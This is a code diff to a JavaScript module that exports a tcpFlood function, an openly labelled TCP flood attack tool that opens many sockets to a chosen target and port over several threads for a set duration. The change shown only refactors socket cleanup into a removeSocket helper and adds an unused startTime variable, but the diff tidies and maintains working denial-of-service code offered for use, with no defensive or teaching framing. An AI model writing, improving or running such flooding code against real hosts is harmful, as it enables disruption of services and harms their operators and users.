@@ -33,6 +33,7 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
   console.log(`Starting TCP flood attack on ${target}:${port} with ${threads} threads for ${duration} seconds.`);
 
   const sockets = [];
+  let startTime = Date.now();
 
   for (let i = 0; i < threads; i++) {
     try {
@@ -60,6 +61,7 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
             } catch(e) {
               console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
             }
+            removeSocket(socket, sockets);
           }
         }, 10);
 
@@ -72,10 +74,7 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
           } catch(e) {
             console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
           }
-          const index = sockets.indexOf(socket);
-          if (index > -1) {
-            sockets.splice(index, 1);
-          }
+          removeSocket(socket, sockets);
         }, duration * 1000);
       });
 
@@ -87,18 +86,12 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
         } catch(e) {
           console.error(`Thread ${i + 1}: Error destroying socket: ${e.message}`);
         }
-        const index = sockets.indexOf(socket);
-        if (index > -1) {
-          sockets.splice(index, 1);
-        }
+        removeSocket(socket, sockets);
       });
 
       socket.on('close', () => {
         console.log(`Thread ${i + 1}: Connection closed.`);
-        const index = sockets.indexOf(socket);
-        if (index > -1) {
-          sockets.splice(index, 1);
-        }
+        removeSocket(socket, sockets);
       });
 
     } catch (socketError) {
@@ -117,6 +110,14 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60) {
       }
     });
   }, duration * 1000);
+
+    // Function to remove socket from the array safely
+    function removeSocket(socket, sockets) {
+        const index = sockets.indexOf(socket);
+        if (index > -1) {
+            sockets.splice(index, 1);
+        }
+    }
 }
 
 export { tcpFlood };
